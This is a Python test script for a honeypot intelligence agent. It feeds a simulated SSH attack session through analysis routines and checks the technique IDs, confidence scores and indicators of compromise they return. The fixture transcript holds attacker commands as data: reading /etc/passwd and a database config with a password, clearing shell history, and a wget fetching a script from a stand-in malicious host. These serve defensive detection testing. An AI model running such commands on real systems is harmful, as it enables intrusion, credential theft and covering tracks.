#!/usr/bin/env python3
"""
Simple comprehensive test for Task 5.1: Session Analysis and Intelligence Extraction
Tests all required functionality in a single agent instance:
- AI-powered transcript and interaction analysis
- Technique extraction and behavioral pattern recognition  
- Confidence scoring and evidence correlation
- Structured intelligence data extraction
"""

import asyncio
import json
import logging
from datetime import datetime, timedelta, timezone
from agents.intelligence.intelligence_agent import IntelligenceAgent
from agents.intelligence.session_analyzer import SessionAnalyzer

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def create_complex_session_data():
    """Create complex session data for comprehensive testing"""
    base_time = datetime.now(timezone.utc)
    
    return {
        "session_id": "comprehensive-test-001",
        "metadata": {
            "honeypot_type": "ssh",
            "source_ip": "203.0.113.42",
            "start_time": base_time.isoformat(),
            "end_time": (base_time + timedelta(minutes=25)).isoformat(),
            "duration_seconds": 1500,
            "user_agent": "OpenSSH_8.0",
            "geolocation": {"country": "Unknown", "city": "Unknown"}
        },
        "transcript": [
            # Initial connection and reconnaissance
            {
                "timestamp": base_time.isoformat(),
                "type": "connection",
                "content": "SSH connection established from 203.0.113.42"
            },
            {
                "timestamp": (base_time + timedelta(seconds=5)).isoformat(),
                "type": "command",
                "content": "whoami"
            },
            {
                "timestamp": (base_time + timedelta(seconds=8)).isoformat(),
                "type": "response",
                "content": "webadmin"
            },
            {
                "timestamp": (base_time + timedelta(seconds=15)).isoformat(),
                "type": "command",
                "content": "id"
            },
            {
                "timestamp": (base_time + timedelta(seconds=18)).isoformat(),
                "type": "response",
                "content": "uid=1001(webadmin) gid=1001(webadmin) groups=1001(webadmin),27(sudo),33(www-data)"
            },
            {
                "timestamp": (base_time + timedelta(seconds=25)).isoformat(),
                "type": "command",
                "content": "uname -a"
            },
            {
                "timestamp": (base_time + timedelta(seconds=28)).isoformat(),
                "type": "response",
                "content": "Linux web-server 5.4.0-74-generic #83-Ubuntu SMP Sat May 8 02:35:39 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux"
            },
            
            # System discovery
            {
                "timestamp": (base_time + timedelta(seconds=40)).isoformat(),
                "type": "command",
                "content": "ps aux | grep -v grep"
            },
            {
                "timestamp": (base_time + timedelta(seconds=45)).isoformat(),
                "type": "response",
                "content": "root         1  0.0  0.1  19312  1544 ?        Ss   10:00   0:01 /sbin/init\nwww-data  1234  0.1  2.3  45678  9876 ?        S    10:15   0:05 apache2\nmysql     5678  0.2  5.1  98765 21098 ?        Sl   10:10   0:12 mysqld"
            },
            {
                "timestamp": (base_time + timedelta(seconds=60)).isoformat(),
                "type": "command",
                "content": "netstat -tulpn"
            },
            {
                "timestamp": (base_time + timedelta(seconds=65)).isoformat(),
                "type": "response",
                "content": "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1234/sshd\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      5678/apache2\ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      9012/mysqld"
            },
            
            # Privilege escalation attempts
            {
                "timestamp": (base_time + timedelta(seconds=90)).isoformat(),
                "type": "command",
                "content": "sudo -l"
            },
            {
                "timestamp": (base_time + timedelta(seconds=95)).isoformat(),
                "type": "response",
                "content": "User webadmin may run the following commands on web-server:\n    (ALL : ALL) NOPASSWD: /usr/bin/systemctl restart apache2\n    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status *"
            },
            
            # File system exploration
            {
                "timestamp": (base_time + timedelta(seconds=150)).isoformat(),
                "type": "command",
                "content": "find /var/www -name '*.php' -type f"
            },
            {
                "timestamp": (base_time + timedelta(seconds=155)).isoformat(),
                "type": "response",
                "content": "/var/www/html/index.php\n/var/www/html/admin/login.php\n/var/www/html/admin/dashboard.php\n/var/www/html/config/database.php"
            },
            {
                "timestamp": (base_time + timedelta(seconds=180)).isoformat(),
                "type": "command",
                "content": "cat /var/www/html/config/database.php"
            },
            {
                "timestamp": (base_time + timedelta(seconds=185)).isoformat(),
                "type": "response",
                "content": "<?php\n$db_host = 'localhost';\n$db_user = 'webapp_user';\n$db_pass = 'secure_password_123';\n$db_name = 'webapp_db';\n?>"
            },
            
            # Credential access attempts
            {
                "timestamp": (base_time + timedelta(seconds=210)).isoformat(),
                "type": "command",
                "content": "cat /etc/passwd | grep -E '(root|admin|user)'"
            },
            {
                "timestamp": (base_time + timedelta(seconds=215)).isoformat(),
                "type": "response",
                "content": "root:x:0:0:root:/root:/bin/bash\nwebadmin:x:1001:1001:Web Administrator:/home/webadmin:/bin/bash\nbackup_user:x:1002:1002:Backup User:/home/backup_user:/bin/bash"
            },
            
            # Tool download attempts
            {
                "timestamp": (base_time + timedelta(seconds=360)).isoformat(),
                "type": "command",
                "content": "wget -O /tmp/scanner.sh http://malicious-site.example.com/tools/scanner.sh"
            },
            {
                "timestamp": (base_time + timedelta(seconds=365)).isoformat(),
                "type": "response",
                "content": "wget: unable to resolve host address 'malicious-site.example.com'"
            },
            
            # Defense evasion
            {
                "timestamp": (base_time + timedelta(seconds=420)).isoformat(),
                "type": "command",
                "content": "history -c"
            },
            {
                "timestamp": (base_time + timedelta(seconds=425)).isoformat(),
                "type": "response",
                "content": ""
            },
            {
                "timestamp": (base_time + timedelta(seconds=500)).isoformat(),
                "type": "disconnection",
                "content": "SSH connection closed"
            }
        ]
    }

async def main():
    """Main test function"""
    logger.info("Starting Comprehensive Task 5.1 Tests")
    logger.info("Testing: Session Analysis and Intelligence Extraction")
    
    # Create single agent instance for all tests
    agent = IntelligenceAgent()
    await agent.start()
    
    try:
        session_data = create_complex_session_data()
        
        logger.info("=== Testing AI-Powered Transcript Analysis ===")
        
        # Test 1: AI-powered transcript analysis
        transcript_analysis = await agent._analyze_transcript_content(session_data["transcript"])
        
        # Verify AI analysis components
        assert "summary" in transcript_analysis, "Missing summary in transcript analysis"
        assert "key_interactions" in transcript_analysis, "Missing key interactions"
        assert "command_analysis" in transcript_analysis, "Missing command analysis"
        assert "interaction_count" in transcript_analysis, "Missing interaction count"
        
        logger.info(f"✓ Transcript analysis completed with {transcript_analysis['interaction_count']} interactions")
        logger.info(f"✓ Session duration: {transcript_analysis.get('session_length_minutes', 0)} minutes")
        logger.info(f"✓ Unique commands detected: {len(transcript_analysis.get('unique_commands', []))}")
        
        logger.info("=== Testing Technique Extraction and Pattern Recognition ===")
        
        # Test 2: Technique extraction
        techniques = await agent._extract_techniques(session_data["transcript"], session_data["metadata"])
        
        # Verify technique extraction
        assert len(techniques) > 0, "No techniques extracted"
        
        # Check for expected MITRE techniques
        technique_ids = [t.get("technique_id", "") for t in techniques]
        expected_techniques = ["T1033", "T1082", "T1057", "T1049", "T1083", "T1548", "T1070"]
        
        found_techniques = [tid for tid in expected_techniques if tid in technique_ids]
        logger.info(f"✓ Extracted {len(techniques)} techniques")
        logger.info(f"✓ Found expected techniques: {found_techniques}")
        
        # Test 3: Pattern recognition
        patterns = await agent._identify_patterns(session_data, transcript_analysis)
        
        # Verify pattern recognition
        assert len(patterns) > 0, "No patterns identified"
        
        pattern_names = [p.get("name", "") for p in patterns]
        logger.info(f"✓ Identified {len(patterns)} behavioral patterns")
        logger.info(f"✓ Pattern types: {pattern_names}")
        
        logger.info("=== Testing Confidence Scoring and Evidence Correlation ===")
        
        # Test 4: Full session analysis with confidence scoring
        analysis_result = await agent.analyze_session(session_data)
        
        # Verify confidence scoring
        assert "confidence_score" in analysis_result, "Missing confidence score"
        confidence_score = analysis_result["confidence_score"]
        assert 0.0 <= confidence_score <= 1.0, f"Invalid confidence score: {confidence_score}"
        
        logger.info(f"✓ Overall confidence score: {confidence_score:.3f}")
        
        # Verify evidence correlation in techniques
        techniques = analysis_result.get("techniques", [])
        for technique in techniques:
            assert "confidence" in technique, "Missing confidence in technique"
            assert "evidence" in technique, "Missing evidence in technique"
            
        logger.info(f"✓ All {len(techniques)} techniques have confidence scores and evidence")
        
        # Verify evidence correlation in findings
        findings = analysis_result.get("findings", [])
        high_confidence_findings = [f for f in findings if f.get("confidence", 0) > 0.7]
        
        logger.info(f"✓ Generated {len(findings)} findings, {len(high_confidence_findings)} high-confidence")
        
        # Verify risk assessment based on evidence
        risk_assessment = analysis_result.get("risk_assessment", "Unknown")
        assert risk_assessment in ["Low", "Medium", "High"], f"Invalid risk assessment: {risk_assessment}"
        
        logger.info(f"✓ Risk assessment: {risk_assessment}")
        
        logger.info("=== Testing Structured Intelligence Data Extraction ===")
        
        # Test 5: Structured data extraction
        required_fields = [
            "session_id", "analysis_id", "timestamp", "session_duration",
            "interaction_count", "findings", "techniques", "patterns",
            "confidence_score", "risk_assessment", "recommendations"
        ]
        
        for field in required_fields:
            assert field in analysis_result, f"Missing required field: {field}"
        
        logger.info("✓ All required structured fields present")
        
        # Verify MITRE ATT&CK integration
        techniques = analysis_result.get("techniques", [])
        mitre_techniques = [t for t in techniques if t.get("technique_id", "").startswith("T")]
        
        logger.info(f"✓ Extracted {len(mitre_techniques)} MITRE ATT&CK techniques")
        
        # Verify IOC extraction
        findings = analysis_result.get("findings", [])
        ioc_findings = [f for f in findings if f.get("type") == "ioc_detection"]
        
        logger.info(f"✓ Extracted {len(ioc_findings)} IOC findings")
        
        # Verify recommendations generation
        recommendations = analysis_result.get("recommendations", [])
        assert len(recommendations) > 0, "No recommendations generated"
        
        logger.info(f"✓ Generated {len(recommendations)} security recommendations")
        
        # Test intelligence report generation
        report_request = {
            "type": "get_intelligence_report",
            "report_type": "detailed",
            "session_id": session_data["session_id"]
        }
        
        report_result = await agent.process_message(report_request)
        assert report_result.get("status") == "success", "Failed to generate intelligence report"
        
        logger.info("✓ Successfully generated detailed intelligence report")
        
        logger.info("=== Testing SessionAnalyzer Capabilities ===")
        
        # Test 6: SessionAnalyzer specialized capabilities
        analyzer = SessionAnalyzer()
        transcript = session_data["transcript"]
        
        # Test command sequence analysis
        command_analysis = analyzer.analyze_command_sequence(transcript)
        assert command_analysis.get("total_commands", 0) > 0, "No commands analyzed"
        
        logger.info(f"✓ Command analysis: {command_analysis['total_commands']} total, {command_analysis['unique_commands']} unique")
        
        # Test sophistication scoring
        score, level = analyzer.calculate_sophistication_score(session_data)
        assert 0.0 <= score <= 1.0, f"Invalid sophistication score: {score}"
        assert level in ["Script Kiddie", "Novice", "Intermediate", "Advanced"], f"Invalid sophistication level: {level}"
        
        logger.info(f"✓ Sophistication assessment: {score:.3f} ({level})")
        
        # Test IOC extraction
        iocs = analyzer.extract_indicators_of_compromise(session_data)
        assert len(iocs) > 0, "No IOCs extracted"
        
        logger.info(f"✓ Extracted {len(iocs)} indicators of compromise")
        
        # Summary
        logger.info("\n" + "="*60)
        logger.info("TASK 5.1 COMPREHENSIVE TEST RESULTS")
        logger.info("="*60)
        logger.info("✓ AI-powered transcript and interaction analysis: PASSED")
        logger.info("✓ Technique extraction and behavioral pattern recognition: PASSED")
        logger.info("✓ Confidence scoring and evidence correlation: PASSED")
        logger.info("✓ Structured intelligence data extraction: PASSED")
        logger.info("✓ SessionAnalyzer specialized capabilities: PASSED")
        logger.info("="*60)
        logger.info("ALL TASK 5.1 REQUIREMENTS SUCCESSFULLY IMPLEMENTED")
        logger.info("="*60)
        
        return True
        
    except Exception as e:
        logger.error(f"Test failed: {e}")
        raise
    finally:
        await agent.stop()

if __name__ == "__main__":
    asyncio.run(main())